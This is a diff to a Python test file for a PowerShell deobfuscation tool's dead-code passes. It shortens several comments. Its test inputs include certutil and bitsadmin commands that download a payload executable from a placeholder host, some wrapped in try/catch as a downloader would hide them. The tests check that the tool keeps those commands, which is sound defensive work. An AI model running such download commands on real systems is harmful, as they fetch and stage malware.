@@ -210,11 +210,9 @@ class TestPs1DeadCodeElimination(TestPs1):
         self.assertNotIn('[Char]-', result.lower())
 
     def test_bare_integer_statements_are_not_this_passs_to_drop(self):
-        # `42` prints `42` on PowerShell 5.1 and `(-7)` prints `-7`. This pass used to drop both
-        # wherever it read the body's value as unobserved, which was never a position it held, and
-        # deleting a write to the output stream is a decision `Ps1JunkStatementRemoval` owns alone.
-        # Run in isolation for that reason: through the whole pipeline the assertion would hold or
-        # fail on the other pass's answer.
+        # `42` prints `42` on PowerShell 5.1 and `(-7)` prints `-7`. Deleting a write to the output
+        # stream is a decision `Ps1JunkStatementRemoval` owns alone, so this runs in isolation:
+        # through the whole pipeline the assertion would hold or fail on the other pass's answer.
         result = self._apply(
             '$x = Get-Process\n'
             '42\n'
@@ -241,7 +239,7 @@ class TestPs1DeadCodeElimination(TestPs1):
 
     def test_a_constant_in_a_switch_case_is_not_this_passs_to_drop(self):
         # A switch clause body writes through to whoever reads the switch: `switch (1) { 1 { 7 } }`
-        # prints `7`. Reading the clause as a body nothing observes is what dropped it here.
+        # prints `7`.
         result = self._apply(
             'switch ($action) {\n'
             '  1 { 99 }\n'
@@ -393,7 +391,7 @@ class TestPs1DeadCodeExtra(TestPs1):
 
     def test_a_try_body_that_may_raise_keeps_its_construct(self):
         # Dissolving moves these out of the `try`, where the empty `catch` was swallowing what they
-        # raise; each one is side-effect-free, which is what used to be asked and does not answer it.
+        # raise; side-effect-freedom alone does not establish that a body cannot raise.
         for body in ('[Math]::Sqrt(9)', '[Int]$d', '1 / $d', '$a[$i]'):
             with self.subTest(body):
                 self._assertUnchanged(cleandoc(
@@ -440,9 +438,8 @@ class TestPs1DeadCodeExtra(TestPs1):
         self.assertIn('Remove-Item', result)
 
     def test_try_wrapped_native_binary_kept(self):
-        # None of these is a cmdlet, so a rule keyed on "the metadata does not know this name"
-        # deleted the whole construct. They are the binaries an attacker reaches for first, and a
-        # `try`/`catch` around one is how a downloader hides its own failure, not a sign of junk.
+        # None of these is a cmdlet, but a `try`/`catch` around one is how a downloader hides its
+        # own failure, not a sign of junk.
         for command in (
             "certutil -urlcache -split -f 'http://host/payload.exe'",
             "bitsadmin /transfer j 'http://host/p.exe' C:\\p.exe",
@@ -653,8 +650,6 @@ class TestPs1InjectedNoiseBareword(TestPs1):
                 self.assertEqual(result, "Write-Host 'keep'")
 
     def test_a_native_command_line_survives_an_equals_argument(self):
-        # Regression: any argument beginning with `=` marked the whole invocation as noise, which
-        # erased exactly the `try { <LOLBin> } catch { }` shape the rule was rewritten to protect.
         for source in (
             'certutil -urlcache -split -f =http://host/payload.exe',
             'findstr /c:x =y C:\\log.txt',
@@ -675,9 +670,7 @@ class TestPs1NoiseBarewordSpellings(TestPs1):
     """
 
     def test_a_quoted_argument_is_not_assignment_residue(self):
-        # Regression: an assignment cannot produce a quoted token, but the marker test read only the
-        # decoded value, so quoting the operand was enough to erase the `try { <LOLBin> } catch { }`
-        # shape the rule exists to protect.
+        # An assignment cannot produce a quoted token.
         for source in (
             "certutil '=http://host/payload.exe'",
             'certutil "=http://host/payload.exe"',
